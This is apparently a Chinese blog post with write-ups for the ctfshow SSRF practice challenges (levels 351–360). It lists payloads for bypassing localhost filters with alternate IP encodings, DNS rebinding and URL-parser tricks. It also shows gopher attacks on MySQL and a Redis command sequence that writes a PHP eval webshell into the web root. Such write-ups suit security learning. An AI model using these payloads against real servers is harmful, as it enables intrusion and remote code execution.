---
title: ctfshow web入门(SSRF)
categories: ctfshow
---

基本跟 ctfhub 中的题目差不多

# 351(基础)
payload：
```
 url=http://127.0.0.1/flag.php
 url=file:///var/www/html/flag.php
```

<!--more-->
---
# 352-353(ip 绕过)

>parse_url
本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。
```
十六进制
  url=http://0x7F.0.0.1/flag.php

八进制
  url=http://0177.0.0.1/flag.php

10 进制整数格式
  url=http://2130706433/flag.php

16 进制整数格式，还是上面那个网站转换记得前缀0x
  url=http://0x7F000001/flag.php

还有一种特殊的省略模式
  127.0.0.1写成127.1

用CIDR绕过localhost
  url=http://127.127.127.127/flag.php

还有很多方式
  url=http://0/flag.php
  url=http://0.0.0.0/flag.php
```

---
# 354(DNS重绑定)
![](https://img-blog.csdnimg.cn/20210415234720962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
上面的方法不行了

1·修改自己域名的a记录，改成127.0.0.1

2·这个网站a记录指向127.0.0.1 可以直接利用

url=http://sudo.cc/flag.php

---
# 355
![](https://img-blog.csdnimg.cn/2021041523485340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
长度限制：
url=http://127.1/flag.php

---
# 356
>if((strlen($host)<=3)){

url=http://0/flag.php

>0在 linux 系统中会解析成127.0.0.1在windows中解析成0.0.0.0

---
# 357(DNS重绑定)
```php
<?php 
error_reporting(0); 
highlight_file(__FILE__); 
$url=$_POST['url']; 
$x=parse_url($url); 
if($x['scheme']==='http'||$x['scheme']==='https'){ 
$ip = gethostbyname($x['host']); 
echo '</br>'.$ip.'</br>'; 
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { 
    die('ip!'); 
} 


echo file_get_contents($_POST['url']); 
} 
else{ 
    die('scheme'); 
} 
?>
```

函数解析：
- gethostbyname()    返回主机名 hostname 对应的 IPv4 互联网地址。

- FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）

- FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）

- FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）

- FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。


不能有内网ip，所以填一个公网ip:

[DNS重绑定](https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg)

![](https://img-blog.csdnimg.cn/20210415235232446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
File_get_contents 得到 flag.php

![](https://img-blog.csdnimg.cn/2021041523534036.png#pic_center)

---
# 358(URL BYPASS)
```php
<?php 
error_reporting(0); 
highlight_file(__FILE__); 
$url=$_POST['url']; 
$x=parse_url($url); 
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){ 
    echo file_get_contents($url); 
}
```

正则表达式的意思是以http://ctf.开头，以show结尾。

payload:
>http://ctf.@127.0.0.1/flag.php?show

![](https://img-blog.csdnimg.cn/20210415235459250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 359(gopherus-无密码mysql)
mysql 默认端口 `3306`

提示是打无密码的mysql

看到源码：

![](https://img-blog.csdnimg.cn/20210415235559256.png#pic_center)

利用点在 returl，gopherus生成

![](https://img-blog.csdnimg.cn/2021041523561569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Payload需要编码一次，因为 `curl会自动解码一次`

![](https://img-blog.csdnimg.cn/20210415235631756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
# 360(redis)
redis 默认端口 `6379`

[浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)

基本利用点：

- 写webshell

- 写ssh公钥
- 写contrab计划任务反弹shell
- 主从复制


Redis是什么
>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，

其具备如下特性：
-	基于内存运行，性能高效

-	支持分布式，理论上可以无限扩展
-	key-value存储系统
-	开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API

手动尝试：

整体过程：
```
flushall
set 1 '<?php eval($_GET["cmd"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```
dict探测 redis 默认端口是否存活：返回+OK 说明redis接收到了

![](https://img-blog.csdnimg.cn/20210415235949346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
设置本地数据库存放地址：可以看到返回一个+OK

![](https://img-blog.csdnimg.cn/20210416000004365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
设置shell.php文件：

![](https://img-blog.csdnimg.cn/20210416000022617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
写马写不进去过滤了 ‘?’ ：短标签也不行，十六进制可以绕过

![](https://img-blog.csdnimg.cn/20210416000038922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)


![](https://img-blog.csdnimg.cn/20210418114211188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)


保存：

![](https://img-blog.csdnimg.cn/20210416000054458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

成功执行：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210418114303400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)
